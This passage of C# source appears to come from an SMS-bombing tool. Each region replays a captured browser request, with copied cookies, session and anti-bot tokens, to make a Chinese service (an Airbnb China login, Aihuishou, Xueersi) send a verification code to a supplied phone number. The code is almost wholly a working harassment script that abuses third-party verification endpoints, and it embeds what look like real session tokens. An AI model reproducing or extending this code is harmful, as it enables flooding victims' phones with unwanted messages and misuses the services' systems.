                request.Headers.Set(HttpRequestHeader.AcceptEncoding, "gzip, deflate, br");
                request.Headers.Set(HttpRequestHeader.AcceptLanguage, "zh-CN,zh;q=0.9,en;q=0.8");
                request.Headers.Set(HttpRequestHeader.Cookie, @"bev=1578390500_MDU4MTAxNDEzNzYz; cdn_exp_3cc08829fdee8c05a=treatment; jitney_client_session_id=57526e12-0592-457c-89d7-74493bfed46f; jitney_client_session_created_at=1578390501; _user_attributes=%7B%22curr%22%3A%22CNY%22%2C%22guest_exchange%22%3A6.973825%2C%22device_profiling_session_id%22%3A%221578390501--569215b9434c3feaebf0afb8%22%2C%22giftcard_profiling_session_id%22%3A%221578390501--7b0c67da50126647634655de%22%2C%22reservation_profiling_session_id%22%3A%221578390501--27a661f10dbf89bb875b59a6%22%7D; flags=0; sdid=; cbkp=4; __xsptplusUT_840=1; _pykey_=a4512a7a-2a79-541d-b5f0-4933877b81be; __xsptplus840=840.1.1578390506.1578390506.1%232%7Cwww.baidu.com%7C%7C%7C%7C%23%23wlvQc8eH0OwBCVwu_Bq0hF7F-D95CS0g%23; auth_jitney_session_id=008b27b2-8237-4b67-9f2b-13d2d006fed5; _csrf_token=V4%24.airbnb.cn%24nYPTF2GuZh4%24ErJeiMvLMloCh1vsykxT5i0wZm8WF-dXt4xt5kFc57o%3D; _airbed_session_id=5177cb72756b21186aa96ed25d2f0909; jitney_client_session_updated_at=1578390510; geetest_data=%7B%22success%22%3A1%2C%22gt%22%3A%22842cc17081653d0e7cf4bde73f80e4a9%22%2C%22challenge%22%3A%227372804b2fd7ad129bf325241fb90213%22%2C%22new_captcha%22%3Atrue%7D");

                request.Method = "POST";
                request.ServicePoint.Expect100Continue = false;

                string body = @"{""phoneNumber"":""86" + mobile + @""",""workFlow"":""LOGIN"",""otpMethod"":""AUTO""}";
                byte[] postBytes = System.Text.Encoding.UTF8.GetBytes(body);
                request.ContentLength = postBytes.Length;
                Stream stream = request.GetRequestStream();
                stream.Write(postBytes, 0, postBytes.Length);
                stream.Close();

                response = (HttpWebResponse)request.GetResponse();
            }
            catch (WebException e)
            {
                if (e.Status == WebExceptionStatus.ProtocolError) response = (HttpWebResponse)e.Response;
                else return false;
            }
            catch (Exception)
            {
                if (response != null) response.Close();
                return false;
            }

            return true;
        }
        #endregion

        #region 爱回收

        [IsAPI("爱回收")]
        public string SMS_ahs()
        {
            Request_www_aihuishou_com(out response);
            return ResponseStr(response);
        }
        private bool Request_www_aihuishou_com(out HttpWebResponse response)
        {
            response = null;

            try
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://www.aihuishou.com/portal-api/captcha/sendsmscaptcha?u_asec=099%23KAFEEEE9EXSEhYTLEEEEEpEQz0yFD6NcSr%2FFD6VJDrB4W6DwSuOYQ6AJBYFETRpCD6ixE7EjK3lP%2F3iU%2Bb8ACowj8l8gO0JxE7EjK3lP%2F3i%2Fed8ACowj8l8gO0JxE7EjK3lP%2F3i%2F3q8ACowj8l8gO0HXE7EFbOR5D6ITETF4luZdtcVyCyJKG6hyu2hP4mQTEExCbPi5SYFEFxilsyaSsoyKbovES0%2FVU2ZjMYFEF1ilsyaQGo8ACy1ESVylO0HXE7EFbOR5D3UTETM41JCt75JllldoRyCJWb8Gby83D0LtfYFEHxGIBODoB3dMu2Z1ZVnabqZTg0s0YJMTEEvl1JktUW3lh3AXE7EFbOR5DcYTEHIFFXMEjrg4kLFAmGPrLLmo3kikiNyV0HUVBFt05cToRhj2iqAkWhj2qi6BC8WccmGboStq3X7ZRJfrkg4OViP%2BMJK01wOLcv64fmZo09m4kLgosEFEp3llsyaSt3llllle33iS1qOlluUdt37qn3llWLaStEA4llle33iSwhirE7EhT3l%2F%2Fo3SBEFE13lls6cRlXPyAYFEqOItD67ScblcL4wsDRrsLaSpwRaKPRvqL7dtPt%2BZNdWp97CWnOId3oa3wy%2ByNa26%2BGA6jYFET%2FdEsyaSt3QTEEjtBKlVDEFET3llsRv4E7EFb%2FR5DJMTEEvlTTkd%2FynlHct%2BE7E7KEwP%2F3GsCyJKbIwiN%2FuP49UTETM41J8tx4OllltMLyCJWb8Gby83D0LtBYFETRpCD6jXE7EFbOR5D6ITETF4luZdtct2CyJKG6hyu2hP4fITETF4luZdtcYDCyJKG6hyu2hP49UTETbQwc1t3LsllluFlyCkQOkG80h04M9eCM8VLMY%3D&u_atype=2");

                request.KeepAlive = true;
                request.Accept = "application/json, text/plain, */*";
                request.Headers.Add("Origin", @"https://www.aihuishou.com");
                request.UserAgent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36";
                request.Headers.Add("DNT", @"1");
                request.Headers.Add("Sec-Fetch-Mode", @"cors");
                request.ContentType = "application/x-www-form-urlencoded";
                request.Headers.Add("Sec-Fetch-Site", @"same-origin");
                request.Referer = "https://www.aihuishou.com/pc/index.html";
                request.Headers.Set(HttpRequestHeader.AcceptEncoding, "gzip, deflate, br");
                request.Headers.Set(HttpRequestHeader.AcceptLanguage, "zh-CN,zh;q=0.9,en;q=0.8");
                request.Headers.Set(HttpRequestHeader.Cookie, @"acw_tc=76b20fe215783915001386794e6d9d41800d1cfaa26edc8ecbca9721a3568c; u_asec=099%23KAFEqEEKEqGEhYTLEEEEEpEQz0yFD6NcSr%2FFD6VJDrB4W6DwSuOYQ6AJBYFETRpCD6iUE7TxTTJ8EFyU0HUAqmoRyUQDBwD4D4Vkukj2cmA3kmwYB1A4k4aqmrg4kLFamdzrLLNoRJ63iwn46%2BAnyNU0pu5sM8TCk7YWQaza0JmfvhBD0HUQBcGTE1LlluZdt3illlllWLaStELpllle33iSw6alluUdt37q03llWLaStEA4sYFETYilssnwtHGTEELlluai%2BlnOkdMTEwpC3fi56wO3aUVEutxsrQdt1YCdCyxVaIS33y9MPz9c%2BvSqrPWC3wnqaGZQ8VoZLMbqi5MTEEylEcZdt3iuE7EF9mC9uf7TEEilluCV; _pk_id.1.5e06=df9030188fcbfddd.1578391502.1.1578391502.1578391502.; _pk_ses.1.5e06=*; gr_user_id=2e6b36b3-82bf-4369-abd5-9db0679a38a7; b053e784452fb69e_gr_session_id=0aa1c18f-bedf-4d97-8bf8-b4d8633901a5; sajssdk_2015_cross_new_user=1; sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2216f7f76fe48112-08b96d6ed7bbfc-5b123211-2073600-16f7f76fe49333%22%2C%22%24device_id%22%3A%2216f7f76fe48112-08b96d6ed7bbfc-5b123211-2073600-16f7f76fe49333%22%2C%22props%22%3A%7B%22%24latest_referrer%22%3A%22%22%2C%22%24latest_referrer_host%22%3A%22%22%2C%22%24latest_traffic_source_type%22%3A%22%E7%9B%B4%E6%8E%A5%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC_%E7%9B%B4%E6%8E%A5%E6%89%93%E5%BC%80%22%7D%7D; Hm_lvt_6206c0fb3ed4e6feb904c97664c91527=1578391502; Hm_lpvt_6206c0fb3ed4e6feb904c97664c91527=1578391502; portal_city=1; portal_city_default=1; b053e784452fb69e_gr_session_id_0aa1c18f-bedf-4d97-8bf8-b4d8633901a5=true; grwng_uid=7ec3edd6-f847-4bc6-b0d0-17eb4a3d87ee; UM_distinctid=16f7f77000513a-0928bbbc61972b-5b123211-1fa400-16f7f77000692; CNZZDATA1256793290=278149105-1578386974-%7C1578386974");

                request.Method = "POST";
                request.ServicePoint.Expect100Continue = false;

                string body = @"mobile=" + mobile + "&type=Login";
                byte[] postBytes = System.Text.Encoding.UTF8.GetBytes(body);
                request.ContentLength = postBytes.Length;
                Stream stream = request.GetRequestStream();
                stream.Write(postBytes, 0, postBytes.Length);
                stream.Close();

                response = (HttpWebResponse)request.GetResponse();
            }
            catch (WebException e)
            {
                if (e.Status == WebExceptionStatus.ProtocolError) response = (HttpWebResponse)e.Response;
                else return false;
            }
            catch (Exception)
            {
                if (response != null) response.Close();
                return false;
            }

            return true;
        }
        #endregion

        #region 学而思

        [IsAPI("学而思")]
        public string SMS_xes()
        {
            Request_reg_xueersi_com(out response);
            return ResponseStr(response);
        }
        private bool Request_reg_xueersi_com(out HttpWebResponse response)
        {
            response = null;

            try
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://reg.xueersi.com/RegV1/sendVcode");

                request.KeepAlive = true;
                request.Headers.Add("Sec-Fetch-Mode", @"cors");
                request.Headers.Add("Origin", @"https://zt.xueersi.com");
                request.UserAgent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36";
                request.ContentType = "application/x-www-form-urlencoded; charset=UTF-8";
                request.Headers.Add("traceid", @"18ab93b8-f31f-446d-8733-bcfd35da5d33");
                request.Accept = "application/json, text/javascript, */*; q=0.01";
                request.Headers.Add("prelogid", @"6b541dbbe4bba70c82c3a4327bc46bf0");
                request.Headers.Add("rpcid", @"1");
                request.Headers.Add("DNT", @"1");
                request.Headers.Add("Sec-Fetch-Site", @"same-site");
                request.Referer = "https://zt.xueersi.com/zaixian/pc-zhu-tiyanke/quanke/indexa.html?xeswx_sourceid=158645615&xeswx_adsiteid=1383144&xeswx_siteid=272&&hot_url=aHR0cHM6Ly9hcnRlbWlzLnh1ZWVyc2kuY29tL3hlcy5waHA/c291cmNlPTE1ODY0NTYxNSZzaXRlX2lkPTI3MiZhZHNpdGVfaWQ9MTM4MzE0NCZiZF92aWQ9MTA2ODgzNjI3OTU3MTk4MDQ4NDYmb2NwY19yZXBvcnQ9YSUzQTUlM0ElN0JzJTNBNiUzQSUyMmJkX3ZpZCUyMiUzQnMlM0EyMCUzQSUyMjEwNjg4MzYyNzk1NzE5ODA0ODQ2JTIyJTNCcyUzQTglM0ElMjJjbGlja19pZCUyMiUzQnMlM0EyMCUzQSUyMjEwNjg4MzYyNzk1NzE5ODA0ODQ2JTIyJTNCcyUzQTklM0ElMjJzb3VyY2VfaWQlMjIlM0JpJTNBMTU4NjQ1NjE1JTNCcyUzQTExJTNBJTIyY3VzdG9tZXJfaWQlMjIlM0JpJTNBMjcyJTNCcyUzQTclM0ElMjJob3RfdXJsJTIyJTNCcyUzQTE0OCUzQSUyMmFIUjBjRG92TDJGeWRHVnRhWE11ZUhWbFpYSnphUzVqYjIwdmVHVnpMbkJvY0Q5emIzVnlZMlU5TVRVNE5qUTFOakUxSm5OcGRHVmZhV1E5TWpjeUptRmtjMmwwWlY5cFpEMHhNemd6TVRRMEptSmtYM1pwWkQweE1EWTRPRE0yTWpjNU5UY3hPVGd3TkRnME5nJTNEJTNEJTIyJTNCJTdEJm1fY2hhbm5lbD1ob3Q=";
                request.Headers.Set(HttpRequestHeader.AcceptEncoding, "gzip, deflate, br");
                request.Headers.Set(HttpRequestHeader.AcceptLanguage, "zh-CN,zh;q=0.9,en;q=0.8");
                request.Headers.Set(HttpRequestHeader.Cookie, @"prelogid=6b541dbbe4bba70c82c3a4327bc46bf0; xesId=1caea8486275fe598ecd331d75167ae8");

                request.Method = "POST";
                request.ServicePoint.Expect100Continue = false;

                string body = @"phone=" + mobile;
                byte[] postBytes = System.Text.Encoding.UTF8.GetBytes(body);
                request.ContentLength = postBytes.Length;
                Stream stream = request.GetRequestStream();
                stream.Write(postBytes, 0, postBytes.Length);
                stream.Close();

                response = (HttpWebResponse)request.GetResponse();
            }
            catch (WebException e)
            {
                if (e.Status == WebExceptionStatus.ProtocolError) response = (HttpWebResponse)e.Response;
                else return false;
            }
            catch (Exception)
            {
                if (response != null) response.Close();
                return false;
            }

            return true;
        }
        #endregion

    }
}
